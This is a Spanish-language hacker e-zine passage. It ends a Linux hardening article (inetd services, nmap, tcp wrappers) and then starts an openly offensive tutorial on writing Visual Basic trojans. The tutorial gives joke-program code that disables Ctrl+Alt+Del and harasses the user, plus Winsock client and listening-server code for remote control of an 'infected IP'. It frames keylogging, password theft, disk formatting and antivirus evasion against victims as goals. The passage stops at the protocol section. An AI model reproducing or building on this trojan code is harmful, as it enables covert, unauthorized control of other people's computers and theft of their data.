mismo,  ubicacion  del  binario,  protocolo,  etc.  Para  eliminar un servicio
simplemente se debe comentar la linea correspondiente;  esto es,   antecederla
con un signo #. Una vez hecho esto, reiniciamos el inetd:

root@localhost:~# killall -HUP inetd

A modo de guia,  algunos   de l os servicios que en la mayoria de los casos no
necesitamos sean ejecutados por inetd son los siguientes:

echo
discard
daytime
chanreg
time
smtp
comsat
shell
login
exec
talk
ntalk
klogin
eklogin
kshell
krbupdate
kpasswd
pop2
pop3
imap
imap2
uucp
tftp
bootps
finger
systat
netstat
rstatd
rusersd 
walld

Por supuesto estos son, como mencione, solamente una guia y no tiene  por  que
ser  estrictamente asi:  en caso de que nuestro daemon de email sea qmail (una
alternativa  mucho  mas  segura y  flexible al sendmail), sera necesario tener
habilitado el smtp desde nuestro inetd.

No  todos los servicios son levantados por el inetd: existen aquellos  quieres
prefieren  ser  ejecutados en forma independiente (por ejemplo Apache).  Estos
deberemos deshabilitarlos individualmente desde los scripts de  inicio,  desde
donde  generalmente  se  ejecutan  (directorio /etc/rc.d). Luego los detenemos
segun corresponda.

Una  vez hecho todo esto, ejecutamos nuevamente nmap, con el cual, en el  caso
mas extremo, deberemos ver algo asi como lo siguiente:

root@localhost:~# nmap 127.0.0.1

Starting nmap V. 2.54BETA1 by fyodor@insecure.org ( 
www.insecure.org/nmap/ )
Interesting ports on localhost (127.0.0.1):
(The 1512 ports scanned but not shown below are in state: closed)

Port       State       Service
21/tcp     open        ftp
22/tcp     open        ssh                     
23/tcp     open        telnet                  
25/tcp     open        smtp                    
53/tcp     open        domain                  
80/tcp     open        http                    
113/tcp    open        auth                    
139/tcp    open        netbios-ssn             
515/tcp    open        printer                 
901/tcp    open        samba-swat              
3306/tcp   open        mysql                   
6000/tcp   open        X11                     
7100/tcp   open        font-service            

Nmap run completed -- 1 IP address (1 host up) scanned in 1 second

Este  es el caso especifico de mi maquina: corro los servicios de ftp y telnet
para  uso  de  forma  interna  solamente;  ssh para acceso exterior (ssh es un
protocolo muy similar a telnet - provee de practicamente la misma funcion,  la
mayor diferencia es que el trafico de datos entre los dos extremos  se realiza
completamente  encriptado).  Tengo,  ademas,  un DNS de cache,  servidor  web,
ident, mysql(base de datos). Los servicios netbios-ssn, printer  y  samba-swat
corresponden a Samba, el que debo utilizar para proveer al otro  computador de
mi peque~a red con acceso a mis archivos de forma local, asi como  yo  tambien
poder acceder a los suyos (dicho computador corre Windows). X11 y font-service
son, justamente, el Sistema X Window y el servidor de fuentes correspondiente.
Como ven, solamente lo justo y necesario. 


Seguridad Externa: Segunda Parte,
Restringiendo, bloqueando y desviando los accesos
*************************************************

A continuacion describire dos metodos para restringir, bloquear y desviar   el
acceso no deseado a servicios ofrecidos por nuestro sistema.

El  primero de ellos es a traves de lo que conoceremos como tcp wrapper:  tcpd
es un programa de control de acceso para servicios de internet.

Lo  utilizaremos  para ejecutar a traves de el muchos (si es que no todos)  de
los daemons del inetd o llamados desde los scripts de inicio.

Su   funcionamiento  es  mas o menos el siguiente: al ocurrir una peticion  de
servicio  a  un programa ejecutado a traves de tcpd, es este quien atiende  la
peticion en lugar del servicio correspondiente. En primer lugar, tcpd consulta
dos   archivos,   deteniendose al encontrar el primer calce:   hosts.allow   y
hosts.deny  (en  este  mismo orden), los cuales se ubican, sorpresivamente, en
/etc.  En  caso  de aceptar la conexion, la peticion es pasada al servicio. El
formato de estos archivos es pracitamente el mismo,  y  se describe de  manera
extensiva en las paginas del manual hosts_access. A modo de resumen,  se tiene 
un par consistente en 
daemon  y cliente por cada servicio, seguido opcionalmente  de  un  comando  a 
ejecutar  en  caso  de  que  se  presente una ocurrencia.  El primero de estos
archivos  contiene  una  lista con los clientes autorizados por cada servicio.

Por el contrario, el segundo contiene una lista con los clientes a  los cuales
se les negara incondicionalmente el acceso al servicio correspondiente.  Todas
aquellas lineas que comiencen con # seran comentarios e ignoradas por el tcpd.
Es posible dentro de estos archivos utilizar expresiones regulares, asi   como
tambien  comodines.  A continuacion mostrare el contenido parcial de estos dos
archivos en mi sistema:

root@localhost:~# cat /etc/hosts.allow
swat: 192.168.0.0/255.255.255.0 127.0.0.1
in.telnetd: 192.168.0.0/255.255.255.0 127.0.0.1

# End of hosts.allow.

Lo   que   aqui   se   dice es que, cualquier peticion a los servicios swat  e
in.telnetd, definidos en /etc/services, provinientes ya sea desde la red local
192.168.0.*  o  desde 127.0.0.1, seran aceptados, sin realizar ninguna  accion
posterior.

root@localhost:~# cat /etc/hosts.deny
swat: ALL
in.telnetd: ALL

# End of hosts.deny.

Por  el  contrario,  en  mi   hosts.deny se deniega el servicio de conexion  a
cualquier  otro  host  no listado en /etc/hosts.allow -  explicitamente   ALL,
sin realizar tampoco ninguna accion posterior.

Existen muchas otras opciones posibles de utilizar en estos archivos. 

Insisto   en  que   se   visite  el manual de hosts_acess para obtener mayores
detalles, asi como mas ejemplos.

Hemos visto como restringir y bloquear en parte el acceso a ciertos servicios.
Existe otra tecnica que consiste en la implementacion de un firewall,  ya  sea
a traves de ipchains en los kernel 2.2, o ipfwadm en las versiones anteriores.
No ahondare profundamente en este tema puesto que el  codigo  de firewall sera
reemplazado nuevamente en el kernel 2.4 por un filtro generico   de  paquetes.

Pero si describire brevemente lo que es posible hacer con ellos.  Configurando
correctamente  y  definiendo las reglas necesarias,  es  posible  bloquear   e
incluso  desviar completamente las peticiones provinientes   desde   cierto(s)
hosts hacia nostros, hacia un puerto especifico o cualquiera.

Las   acciones   a  tomar  pueden ir desde denegar completamente   la conexion 
(haciendo  que esta  nunca llegue realmente a su destino), lo que hara parecer
al cliente que esta efectuando la peticion  que nuestro   host  esta   muerto;
desviar la peticion directamente hacia otro host (que perfectamente  puede ser
uno no existente, logrando algo similar a lo anterior)  o  rehusar formalmente
la conexion, con la devolucion del correspondiente  paquete ICMP de connection 
refused (lo que se?alara que nuestro host realmente existe y vive).

Como   hemos   podido   apreciar,  las posibilidades son multiples y variadas, 
practicamente  infinitas,   y combinando estas dos herramientas de  proteccion
podemos tener un  sistema altamente protegido. Es necesario destacar el  hecho
de que no existe un sistema completamente incrackeable o invulnerable, por mas
que asi lo queramos. Asi como constantemente aparecen nuevas herramientas   de
proteccion y versiones menos vulnerables de los servicios,  siempre  existiran
quienes se dediquen a descubrir nuevas formas de romper estas  protecciones. Y
es el ciclo natural de todo esto.

Obviamente  esto puede ser alivianado en parte manteniendose informado de  las
vulnerabilidades  descubiertas, anuncios de seguridad, parches disponibles   y
actualizaciones.  Y  es   justamente esto lo que veremos en nuestra tercera  y
ultima parte.


Seguridad Externa: Tercera Parte, conociendo al enemigo
*******************************************************

Para   poder   conocer  con  mayor precision la filosofia y forma de actuar de
quienes estan en condiciones de atacarnos, es necesario entrar en parte a  ese
mundo  y  unirse temporalmente al lado oscuro del a fuerza. Vale aclarar   que,
con  esto,  no estoy   incitando  a nadie a ser un cracker y destruir   cuanto
servidor se les pase por delante. Al contrario, es una recomendacion didactica
con el fin de proteger de mayor manera nuestro sistema.

Por  supuesto esta no es una tarea facil: no solamente requeriremos de  tiempo
para  indagar  y  expermientar, en la mayoria de los casos es necesario contar
con  una  habilidad innata. El usuario comun y corriente no esta  dispuesto  a
entrar  en estos tecnicismos, pero aun asi es importante  para  el  mantenerse
informado de lo que sucede en el mundo.

El primer paso hacia esto es frecuentar sitios de actualidad sobre  seguridad,
como lo es PacketStorm, asi como tambien pertenecer y estar suscrito  a listas
de  correo  sobre  el tema como BUGTRAQ En estos lugares podremos  mantenernos
constantemente   informados   sobre  las   vulnerabilidades,  anuncios  de los
fabricantes e investigadores,   asi  como   los parches y/o   soluciones a los
problemas  emergentes,   generalmente  en  cuestion  de  minutos u horas de su
origen.

Sitios de este estilo existen muchos, solo es cosa de profundizar en el tema y
estos iran apareciendo. Para quienes se interesen,  una muy  buena  prueba  es
tratar de violar la seguridad de su propio sistema.  Tambien es posible armar,
con  otra gente interesada (y con su consentimiento claro esta)  las  llamadas
redes de crackeo, que consisten basicamente en formar un grupo con el objetivo
de tratar de romper la seguridad de los sistemas de los demas integrantes  del
mismo, a la vez de proteger de la mejor manera posible la propia.


Hacker y Cracker: -No es lo mismo?
***********************************

Con   esto   quiero   terminar,   y es aclarar la gran y sustancial diferencia
existente entre estos dos terminos.

Generalmente,  cuando se  escuchan referencias al termino hacker,  la  primera
imagen  que  se  forma  es  de un  ciberdelincuente,  alguien con  capacidades
extremadamente   sorprendentes   para ingresar  en  forma  ilicita a cualquier
sistema  y  extraer informacion protegida a la cual no debiera tener acceso  o
simplemente destruirlo. Este es un grave error, fundado principalmente  por la
informacion  distorsionada  entregada  por  los  medios  sensacionalistas   al
respecto.

Un  hacker  propiamente  tal  es  una persona con conocimientos algo avanzados
sobre  un tema especifico (no necesariamente informatica, existen por  ejemplo
hackers de la astronomia), dispuesto siempre a experimentar y adquirir  nuevos
conocimientos,   generalmente   poniendolos  a  disposicion   de  la comunidad
circundante. Un hacker es, por ende, un ser benigno. De hecho la Internet  que
conocemos hoy en dia no seria lo que es si no fuera por  la  intervencion   de
famosos hackers (y anonimos tambien), quienes han propuesto   e   implementado
muchos de los protocolos y tecnologias existentes en este ambiente.

Un  cracker  por otro lado, es un ser con alta capacidad de aprendizaje  sobre
seguridad   y  las formas de violarla, y habilidades para ingresar a  sistemas
ajenos, generalmente con malas intenciones.



-[06. Programacion de sockets para troyanos]-----------------------[by b||os]-


Introduccion al Virii
Programacion de sockets para troyanos



hi dude, aki yo again  y  esta vez vengo con algo ke les resultara intereante, se
trata de programacion de sockets para poder programar nuestros propios troyanos.


++++++++++++++++++++
Tabla de contenidos.
++++++++++++++++++++


1.  Introducion

2.  Que es un Troyano??? (otra vez con la misma wueaita!!!)
     2.1 Caracteristicas
     2.2 Proceso de Infeccion

3.  Joke program

4.  Cliente-Servidor
     4.1 Cliente
     4.2 Servidor
     4.3 Funciones del Troyano

5.  Protocolo

6.  Encripcion de codigo (evitando Crakeos)

7.  Agarrame este paquetito!!!

8.  Recopilacion de codigos parciales

9.  Despedida





+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
1. Introduccion...                ...Por que programar troyanos y en Visual Basic
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
												    b||os


Estoy casi 100% seguro, que de todas las personas que estan leyendo esto lo estan
haciendo desde Windows,  por lo tanto,  decidi escribir este texto orientado a la
programacin con Visual Basic, pero,  esta no es una razon fuerte, hay mas. Visual
Basic  es facil,  esta disponible en Internet  en algun buen sitio de Warez,  hay
bastante ayuda sobre este lenguaje y por ultimo, si tienes Windows, tienes Office
por lo tanto, puedes utilizar el editor del Visual Basic que trae el Office.

En otras palabras, los medios estan, solo falta que tu te animes a aprender.

Los troyanos nos pueden   servir de  mucho,  imaginense que  nos ayudemos  de  un
keylogger y una vez instalado en  el  computador victima, el troyano nos envie lo
que el keylogger ha registrado???,  interesante,  pero esto  no es nada comparado
con todo lo que un troyano nos puede dar.

Suelen llegar al IRC locos  preguntando como se utiliza el Netbus (por ke siempre
llegan preguntando por el  netbus!!!) y ni lo tienen en sus HDD y kieren aprender
a utilizarlos,  bueno,  yo siemrpe ayudo, pues como muchos de nosotros, empezamos
a meternos en esto gracias  al  Netbus XDDDD eso si,  algunos tardan mas en darse
cuenta  de  que el Netbus no es lo mejor,  y lamentablemente,  otros nunca se dan
cuenta de eso.

El hecho de utilizar troyanos no nos hace  mas lamos, pero si uno siempre utiliza
troyanos que son bajados desde  Internet  y  mas encima,  hace puras wueas  y  se
autodenomina Hacker, esta cagao. Miren esto:

llega un tipo, en su Navegador pone  www.altavista.com  y busca Netbus, en unos 5
minutos mas, tiene el Netbus  en su HDD ( no me digan  ke  no  por  ke  no tienen
espacio, pero pa los Mb de minas en pelota, si los tienen),  bueno,  por ahi,  en
alguna ezine o en algun chat se entero del uso del Netbus, pesco un  Script  para
mIRC que busca Troyano en las listas de Nicks de los Canales,  tomo  el  IP  y se
cago  a  un loko a una mina, le vende la mula etc. Cuanto time le tomo hacer todo
eso??? y mas encima, se va a la cama pensando que es  un  verdadero Hacker,  y ke
hay del pajeo que se mando el tipo ke programo el Netbus???. A eso voy,  utilicen
troyanos que ustedes  programen,  utilicenlos con  sabiduria,  son  entretenidos,
exitantes y no se queden pegados con el Netbus, el bo2k etc, despues de todo, eso
es una etama mas de muchas otras. (como Crackear Virus escuche por ahi???)




+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
2. Que es un Troyano???...                                 ...Cuestion de Codigos
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
												    b||os


Los troyano son programas muy viejos, tanto como los virus.  Al principio  fueron
dise?ados para alterar cuentas de bancos y financieras o para almacenar registros
de datos que puedan ser de gran utilidad (todo turbio po XDDD).  El troyano es un
codigo fuente maligno oculto dentro de otro benigno, de esta manera,  mientras el
tipo se entretiene con su programa, el troyano hace de las suyas en el computador
mientras trabaja de forma bastante piola.

El troyano hoy en dia hace algo diferente, con el  desarrollo de Internet, se han
destinado estos programas  al  control  remoto  de  un  ordenador.  Esto  permite
controlar desde tu escritorio  un  computador que se  encuentra  a  kilometros de
donde te encuentras,  todo gracias  a  internet.  Los  troyanos  para  funcionar,
nececitan dos programas un Cliente, un Servidor, un IP y listo. Lo del  Cliente y
el Servidor, se explica mas adelante,  pero, el  IP tiene que  presentar  ciertas
carcteristicas.   Hablemos entonces de  un IP  infectado por un Troyano.  Existen
muchos troyanos  y no todos utilizan el mismo puerto de comunicaciones TCP o UDP,
pero,  se dan casos es que mu troyano  utiliza  mas  de un puerto,  o  que muchos
troyanos utilizan el mismo puerto.


2.1 Caracteristicas
+++++++++++++++++++

Los troyanos  realizan muchas  funciones,  entre ellas tenemos algunas  y las mas
comunes que son las siguientes:

a) Requieren de un IP Infectado

b) Abren puertos en los computadores victimas

c) Formatean Discos duros

d) Copian, Pegan, Cortan archivos y directorios

e) Suben y bajan archivos

f) Controlan Teclado y Mouse

g) Envian mensajes

h) Obtienen Passwords

i) Ejecutan programas y cierran otros

j) No podia faltar la clasica!!!, abrir el CD  XDDDDD


2.2 Proceso de Infeccion
++++++++++++++++++++++++

La infeccion consiste en lograr que el troyano quede residente en la memoria  del
ordenador victima, escuchando por conecciones. Ademas, el  troyano  se  autocopia
a algunos directorios  establecidos  por el  programador  del troyano, que por lo
general son los directorios de sistema (pueden ser WINDOWS o WINDOWS\SYTEM).

El troyano registra un orden, no estricto, pero, segun yo, es bueno y suficiente:

Primero, busca en los registros del windows, los directorios que son de sistema.

Despues se copia a esos directorios.

Luego infecta los  archivos que pueden asegurar su futura ejecucion al momento de
la carga del windows (registros, win.ini, autoexec.bat)

Reside en la memoria escuchando por conecciones.

Cuando se cierra el windows, el troyano se vuelve  a asegurar que sera  ejecutado
la proxima vez que el PC se encienda (Vieron Duro de Matar??? de  donde  creen ke
se inspiraron pa filmar pa pelicula???).

Ahora les voy a poner una lista de puertos de los troyanos mas conocidos:

NO!!!, la misma wueaita de siempre, esta bueno ke paremos con lo de los puertos,
haha, estan por todos lados!!! son parte de nuestra cultura general!!!!!!!...





+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
3. Joke program...                                ...Parecen Virus pero no lo son
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
												    b||os


Estos programas llamados "Joke Programs" son los tipicos  programitas "broma" que
te mandan tus amigos, esos que te abren el CD,  o  que se te corre la pantallita,
el boton,  o  hace que te borra los archivos.  Esta vez,  nos van  a  servir para
utilizarlos como programas benignos, mientras  el tipo se entetiene wuebiando con
el programita, el troyano trabaja trankilo.

Uno de mis favoritos es el del CD, el que te putea con mensajes y cada vez que
pones "Aceptar" te abre o cierra el CD.

Su programacion, en VB es simple, y es la siguiente:


<!-- inicio del codigo --!>
Option Explicit 'este es el infaltable option explicit
'declaro llamadas a DLL, que son los encargados de abrir/cerrar el CD y de evitar
'que cuando  se presione  Ctrl + Alt + Supr puedan desactivar el programa, o sea,
'se lo tendran que mamar hasta el final!!!.

Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" _
(ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal _
uReturnLength As Long, ByVal hwndCallback As Long) As Long

Private Declare Function SystemParametersInfo Lib "user32" Alias _
"SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal _
lpvParam As Any, ByVal fuWinIni As Long) As Long

Dim x As Variant

'utilizo el evento Load del formulario para que se inicie el wuebeo!!!
Private Sub Form_Load()
Form1.Hide 'ocultamos el formulario, no nos sea de utilidad
Form1.WindowState = 2 'utilizamos esta propiedad para maximizar el form
'despues explicare por que
Form1.BackColor = vbWhite 'utilizamos esta propiedad del Form para poner
'el color de fondo a blanco
'------------------------------------------------------------------------
'IMPORTANTE!!!-----------------------------------------------------------
'aki se debe colocar la propiedad del Formulario BorderStyle a a 0 - None
'pero eso se hace desde las propiedades del Form, no desde el codigo-----
'------------------------------------------------------------------------
DisableCtrlAltDelete True 'desactivamos los botones de Ctrl + Alt + Supr
x = mciSendString("set CDAudio door open", 0&, 0, 0)
    MsgBox "Que chucha, se te abrio el CD????", vbExclamation
x = mciSendString("set CDAudio door closed", 0&, 0, 0)
    MsgBox "Y ahora se cerro solo???, que onda, esta vivo mi computador???", vbExclamation
x = mciSendString("set CDAudio door open", 0&, 0, 0)
    MsgBox "nop, no esta vivo, fue un programador rq!!! jajajajajaja", vbExclamation
x = mciSendString("set CDAudio door closed", 0&, 0, 0)
    MsgBox "Y mas encima, me han desactivado Ctrl + Alt + Supr...", vbExclamation
x = mciSendString("set CDAudio door open", 0&, 0, 0)
    MsgBox "...putamadre, tendre que mamarme este programa hasta el final", vbExclamation
x = mciSendString("set CDAudio door closed", 0&, 0, 0)
    MsgBox "sera po, y que???, tay sonao, tendrias que resetear tu PC", vbInformation
x = mciSendString("set CDAudio door open", 0&, 0, 0)
    MsgBox "con ello, perderas la informacion que no has guardado en tu PC", vbInformation
x = mciSendString("set CDAudio door closed", 0&, 0, 0)
    MsgBox "piensalo bien, mejor mamarse este programa hasta el final", vbInformation
x = mciSendString("set CDAudio door open", 0&, 0, 0)
    MsgBox "en todo caso, entero vago el programa...", vbExclamation
x = mciSendString("set CDAudio door closed", 0&, 0, 0)
    MsgBox "...el programador rq no tiene nada mejor que hacer???", vbExclamation
x = mciSendString("set CDAudio door open", 0&, 0, 0)
    MsgBox "le dio con mi CD, bueno, podria haber sido peor...", vbExclamation
x = mciSendString("set CDAudio door closed", 0&, 0, 0)
    MsgBox "...peor????????!!!!!", vbExclamation
x = mciSendString("set CDAudio door open", 0&, 0, 0)
    MsgBox "hmmmm", vbExclamation
x = mciSendString("set CDAudio door closed", 0&, 0, 0)
    MsgBox "no, no, esta vez, creo que no ha programado algo peor...", vbExclamation
x = mciSendString("set CDAudio door open", 0&, 0, 0)
    MsgBox "...no me queda mas que confiar mas en el", vbExclamation
x = mciSendString("set CDAudio door closed", 0&, 0, 0)
Form1.Show
x = mciSendString("set CDAudio door open", 0&, 0, 0)
    MsgBox "ups!!!, y ahora que paso???", vbExclamation
x = mciSendString("set CDAudio door closed", 0&, 0, 0)
Form1.Hide
x = mciSendString("set CDAudio door open", 0&, 0, 0)
    MsgBox "ah.... que bien, volvio todo a ser como antes.", vbExclamation
x = mciSendString("set CDAudio door closed", 0&, 0, 0)
    MsgBox "hey, te sugiero que no intentes presionar Ctrl + Alt + Supr", vbInformation
x = mciSendString("set CDAudio door open", 0&, 0, 0)
    MsgBox "te lo digo yo, que programe esta wuea", vbInformation
x = mciSendString("set CDAudio door closed", 0&, 0, 0)
    MsgBox "ah, mas encima, me amenazan", vbExclamation
x = mciSendString("set CDAudio door open", 0&, 0, 0)
    MsgBox "ahora, pa cachar cuanto le queda a este maldito programa", vbExclamation
x = mciSendString("set CDAudio door closed", 0&, 0, 0)
    MsgBox "ponte a contar maldito animal!!!", vbInformation
x = mciSendString("set CDAudio door open", 0&, 0, 0)
    MsgBox "10", vbExclamation
x = mciSendString("set CDAudio door closed", 0&, 0, 0)
    MsgBox "9", vbExclamation
x = mciSendString("set CDAudio door open", 0&, 0, 0)
    MsgBox "8", vbExclamation
x = mciSendString("set CDAudio door closed", 0&, 0, 0)
    MsgBox "7", vbExclamation
x = mciSendString("set CDAudio door open", 0&, 0, 0)
    MsgBox "6", vbExclamation
x = mciSendString("set CDAudio door closed", 0&, 0, 0)
    MsgBox "5", vbExclamation
x = mciSendString("set CDAudio door open", 0&, 0, 0)
    MsgBox "4", vbExclamation
x = mciSendString("set CDAudio door closed", 0&, 0, 0)
    MsgBox "3", vbExclamation
x = mciSendString("set CDAudio door open", 0&, 0, 0)
    MsgBox "2", vbExclamation
x = mciSendString("set CDAudio door closed", 0&, 0, 0)
    MsgBox "1", vbExclamation
x = mciSendString("set CDAudio door open", 0&, 0, 0)
    MsgBox "oka, ahora, te dejo respirar trankilo loko", vbExclamation
x = mciSendString("set CDAudio door closed", 0&, 0, 0)
    MsgBox "bye dude, y si ves a b||os por ahi, saludame ya????", vbExclamation
x = mciSendString("set CDAudio door open", 0&, 0, 0)
DisableCtrlAltDelete False 'volvemos a activar el Ctrl + Alt + Supr
x = mciSendString("set CDAudio door closed", 0&, 0, 0)
End 'terminamos el programa
End Sub

'la siguiente funcin nos ayuda a desactivar o activar los botones de
'Ctrl + Alt + Supr

Sub DisableCtrlAltDelete(bDisabled As Boolean)
Dim y As Long
y = SystemParametersInfo(97, bDisabled, CStr(1), 0)
End Sub
<!-- Fin del codigo --!>


Ese seria un Joke program, pero, aun faltan mas, como por ejemplo,  recuerdan las
propiedades  mencionadas  en  el  codigo???  las  de  WindowsState,  Backcolor  y
BordeStyle??? esas mismas, nos puedes servir para hacer un protector  de pantalla
con  alguna mina  en  pelota (que??? como que que es eso???) o con alguna foto de 
algun  artista  favorito,  sobretodo  el  de  tu victima. (las Super Novas pa una 
queria amiga XDDDDDDD). Este  protector  de  pantalla  lo dejo a ustedes, ya todo
esta dicho, como ayudita, les doy unos eventos para cerrarlo:

<!--Inicio del codigo--!>
Private Sub Form_Click()
End
End Sub

Private Sub Form_KeyPress(KeyAscii As Integer)
End
End Sub

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
End
End Sub
<!--Fin del codigo--!>

Otro programa que nos va  a  servir es ese que se corre cuando le vamos  a  hacer
Click y lo hace una y otra vez.


<!--Inicio del Codigo--!>
Option Explicit 'esta no falta, recuerdenlo!!!

'este  evento  se produce cuando movemos el mouse sobre un formulario
'aki, las propiedades de posicion del formulario son las que varian (X, Y)
Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Form1.Left = Int(9000 * Rnd) + 1
Form1.Top = Int(7000 * Rnd) + 1
End Sub

'--------------------------------------------------------------------------
'los tres eventos que siguen son iguales-----------------------------------
'estos se activan cuando el formulario se cierra---------------------------
'hacen que el formulario deaparezca de la pantalla, pero, aun sigue cargado
'cuando menos se lo esperan, vuelve a aparecer-----------------------------
'--------------------------------------------------------------------------
Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
Dim tiempo As Long
Dim espera As Integer
Cancel = 1 'esto cancela el evento, en este caso, el formulario no se cierra
Form1.Hide 'oculta el formulario
tiempo = Timer 'hago que la var tiempo sea los segundos que Timer indike
espera = Int(10 * Rnd) + 1 'hago que la var espera sea aleatorioa entre 1 a 10 unidades
Do While Timer < tiempo + espera
DoEvents
Loop
Form1.Show 'vuelvo a mostrar el formulario
End Sub

Private Sub Form_Terminate()
Dim tiempo As Long
Dim espera As Integer
Cancel = 1
Form1.Hide
tiempo = Timer
espera = Int(10 * Rnd) + 1
Do While Timer < tiempo + espera
DoEvents
Loop
Form1.Show
End Sub

Private Sub Form_Unload(Cancel As Integer)
Dim tiempo As Long
Dim espera As Integer
Cancel = 1
Form1.Hide
tiempo = Timer
espera = Int(10 * Rnd) + 1
Do While Timer < tiempo + espera
DoEvents
Loop
Form1.Show
End Sub
<!--Fin del codigo--!>


A este formulario se le debe a?adir un Boton, pa que el loko jure ke desde ahi se
cierra la wueaita y una etiqueda diciendo lo ke tu kieras.

nota que los botones de Maximizar  y Minimizar  los  puedes  eliminar  desde  las
propiedades, pero deja el de cerrar, pues sera esa la mayor gracia del programita

Luego veremos como los joke programs son ejecutados junto con el troyano, para
eso vean el punto 7.




+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
4. Cliente-Servidor...                                              ...Estructura
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
												    b||os



Adivinaron, nuestro trabajo esta enfocado  a  la estructura Cliente-Servidor, por
lo que utilizaremos el protocolo TCP.

Esta estructura es vital para lo que queremos hacer, pero, ojo,  un troyano puede
funcionar sin esto, pues existen troyanos que trabajan sin control remoto.


4.1 Cliente
+++++++++++

Este sera le programa que utilizaremos nosotros, que tambien programaremos, y que
nos permitira controlar el Troyano instalado en la maquina remota.

La programacion de este Cliente,  requiere  principalmente  de un entorno grafico
amigable, aunque  no  necesario, pero,  sera  con el cual nos  entenderemos  para
controlar el troyano.

Este programa (Cliente) requiere de  un IP para poder localizar el Servidor en el
computador remoto, una vez localizado, este  pide  autorizacino para  conectarse,
y cuando se le acepta, comienza lo divertido.

El Cliente,  no requiere infectar registros ni archivos,  y su ejecucion no tiene
que ser piola como el Servidor.  A partir de este momento,  referire como Cliente
a la parte del troyano que sera la que CONTROLA a la otra,  y Servidor a la parte
del troyano que es CONTROLADA por la otra.

Comencemos con la programacion del Cliente.

En el Visul Basic, creamos un nuevo proyecto, ahi, le a?adimos un control Winsock
con el cual trabajaremos al Maximo.  El resto  de los controles los a?adiremos al
final una vez que tengamos claro lo que haremos  con el  troyano, estos controles
son Botones, cajas de texto, etiquetas, etc.

El codigo que sigue, pertenece a las propiedades  del  control Winsock que  seran
establecidas al momento de la carga del formulario.

<!--inicio del codigo--!>
Private Sub Form_Load()
Winsock1.RemotePort = 69 'este puerto lo escojen ustedes y es el mismo tanto para
'el cliente como para el servidor. aki, el numero 69 es solo un ejemplo, pero
'ustedes pueden utilizar cualkier otro, les recomiendo uno mayor que 10000
End Sub
<!--fin del codigo--!>

Por ahora, necesitamos dos controles, un Boton y una Caja  de texto para  colocar
el IP infectado con nuestro Servidor  y  el boton para iniciar  la  coneccion. El
codigo del boton es el siguiente:

<!--inicio del codigo--!>
Private Sub Command1_Click()
Winsock1.RemoteHost = Text1.Text 'aki el Text1.Text es el IP infectado que hemos
'puesto en la caja de texto
Winsock1.Connect 'esta propiedad hace que el control Winsock inicie la coneccion
End Sub
<!--fin del codigo--!>

Vamos claro hasta ahora???, esto esta muy muy facil eh.

Como dije anteriormente, el resto de los controles los explicare al final.


4.2 Servidor
++++++++++++

Este programa el la segunda parte del troyano, y es  lo opuesto  al  Cliente,  es
quien recibe las ordenes del Cliente y las ejecuta.  Es mas, la ejecucion de este
programa tiene ke ser de lo mas piola, para evitar ser detectado.

Al final de todo esto,  se  llevaran  una  sorpresa  si escanean su  Troyano  con
cualkier antivirus, hasta la ultima de las ultimas ediciones XDDDDDDD.

El Servidor escucha  por  conecciones  y  las acepta,  espra las  ordenes que son
comandos establecidos por nosotros mismos, esto lo detallare en el  punto 5, como
protocolos, ya que necesitamos  un "lenguaje" entre ambos programas,  el  Cliente
y el Servidor necesitan una comunicacion rapida, clara y variada.

La programacion  del  Servidor esta  basada  principalmente en  la  ejecucion  de
comandos en el sistema, no al entorno grafico como lo es el Cliente. Que wuea???,
me explico: el troyano debe controlar el sistema que  esta atacando con  el mismo
sistema, es decir, que toma comandos que ya existen  en el propio sistema  en  el
cual reside como el DOS, con  su  delete, y  mejor  aun,  el format. tambien,  es
necesario explotar los DLL del windows, estos son muy potentes herramientas.

Comenzando con el codigo del Troyano, tambien necesitamos establwecer propiedades
al momento de carga del formulario.

Como en el Cliente, a?ade un control Winsock al formulario y pon este codigo:

<!--inicio del codigo--!>
Private Sub Form_Load()
Winsock1.LocalPort = 69 'aki pones el mismo puerto con el cual trabaja el Cliente
Winsock1.Listen 'esta propiedad pone a escuchar por peticiones de coneccion
End Sub
<!--fin del codigo--!>

Cortita. bien, ahora, el control Winsock posee un evento que salta cuando se hace
una peticion de coneccion, fijense en este codigo:

<!--inicio del codigo--!>
Private Sub Winsock1_ConnectionRequest(ByVal requestID As Long)
If Winsock1.State <> sckClosed Then Winsock1.Close 'si el socket se encuentra
'abierto, se cierra para aceptar una nueva coneccion
Winsock1.Accept requestID
End Sub
<!--fin del codigo--!>

Ahora,  una vez que el socket  a  aceptado la peticion de coneccion,  necesitamos
otro evento  que salta cuando se reciben datos  por el Cliente,  su codigo  es el
siguiente:

<!--inicio del codigo--!>
Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Dim sockData As String 'sin esta instruccion tamos cagaos, el socket recibe
'puras wueas como ?????????????4?????3????????8????? etc
Winsock1.GetData sockData 'el socket recibe los datos y los mete en esta variable
End Sub
<!--fin del codigo--!>

Este evento,  sera el mas importante,  pues en el el se comienzan las ejecuciones
de las ordenes que llegan desde el Cliente.




+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
4. Protocolo...                                     ...Fin del codigo del Troyano
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
												    b||os


Todo servicio posee su propio RFC, como por ejmplo, el IRC tiene el RFC 1459, hay
que ver el troyano como  un servicio que ofrece un Servidor (y ke servicio!!!)  y
por lo tanto necesitamos nuestro propio RFC o adoptar uno existente,  pero,  este
no es el caso para esta ocacion. Como dije, tendremos  que  inventar un protocolo
con el cuan, el Clietne con el Servidor se comunicaran.

